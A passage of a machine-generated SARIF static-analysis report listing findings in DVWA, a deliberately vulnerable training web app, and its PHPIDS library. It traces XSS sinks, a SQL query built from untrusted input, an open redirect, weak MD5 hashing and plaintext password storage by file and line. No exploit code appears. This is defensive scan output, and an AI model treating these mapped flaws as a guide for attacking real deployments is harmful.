          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "session-input.php:12 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "session-input.php:12 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "session-input.php:12 - Assignment to $_SESSION['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "session-input.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "session-input.php:15 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "session-input.php:18 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "session-input.php:28 - dvwasourcehtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/session-input.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4619",
      "message" : {
        "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "9E81BA00D7AAE4C892EB58265636147C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 435,
            "endLine" : 435,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:12 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:12 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:12 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:13 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:13 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:14 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:14 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:27 - Assignment to $login_state"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:35 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:52 - dvwasourcehtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 52
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4683",
      "message" : {
        "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "D169BBDAA12DEAB5183DF3D8E215D862"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 435,
            "endLine" : 435,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:72 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:95 - dvwasourcehtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 95
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4637",
      "message" : {
        "text" : "On line 499 of dvwaPage.inc.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B20975E25F6257FE5E2EAD6288BBB676"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 499,
            "endLine" : 499,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:499 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 499
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:499 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 499
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4446",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "347EB4D8D04F5B543316E04AB7E299EE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 511,
            "endLine" : 511,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:511 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 511
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:511 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 511
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4529",
      "message" : {
        "text" : "The file dvwaPage.inc.php passes unvalidated data to an HTTP redirect function on line 533. Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "6A7765E6B52AD9D45C3ED9912B74DE8B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 533,
            "endLine" : 533,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:118 - Read $_SERVER['PHP_SELF']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 118
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:533 - header(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 533
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:118 - Read $_SERVER['PHP_SELF']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 118
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:118 - dvwaredirect(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 118
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:533 - header(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 533
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4552",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "77981058BFBB71926CF0405EAC3D1B99"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 573,
            "endLine" : 573,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:573 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 573
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:573 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 573
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4390",
      "message" : {
        "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "1377228420F7C55FC1420711846BB5A4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/examples/example.php"
          },
          "region" : {
            "startLine" : 82,
            "endLine" : 82,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:43 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:43 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request : return->events['?']->value)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4489",
      "message" : {
        "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "5792ABB522BB3890BAFEAD38BFA35D09"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/examples/example.php"
          },
          "region" : {
            "startLine" : 82,
            "endLine" : 82,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:45 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:45 - Read $_COOKIE"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request : return->events['?']->value)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4641",
      "message" : {
        "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "B5A32B652D0F38273137DEF6BD2A70AD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/examples/example.php"
          },
          "region" : {
            "startLine" : 82,
            "endLine" : 82,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:44 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 44
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:44 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 44
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request : return->events['?']->value)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4703",
      "message" : {
        "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E1C10FF646D5E142CB1A105E79C50D34"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/examples/example.php"
          },
          "region" : {
            "startLine" : 82,
            "endLine" : 82,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:42 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:42 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request : return->events['?']->value)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:82 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4753",
      "message" : {
        "text" : "The file IDS_Caching.html on line 32 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F967BDCE00A6EF97BC6B0868416F8CB3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
          },
          "region" : {
            "startLine" : 32,
            "endLine" : 32,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching.html:32"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching.html:32"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4754",
      "message" : {
        "text" : "The file IDS_Caching.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F967BDCE00A6EF97BC6B0868416F8CB4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
          },
          "region" : {
            "startLine" : 34,
            "endLine" : 34,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4755",
      "message" : {
        "text" : "The file IDS_Caching.html on line 120 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F967BDCE00A6EF97BC6B0868416F8CB5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
          },
          "region" : {
            "startLine" : 120,
            "endLine" : 120,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Caching.html:120"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
                },
                "region" : {
                  "startLine" : 120
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Caching.html:120"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Caching.html"
                },
                "region" : {
                  "startLine" : 120
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4406",
      "message" : {
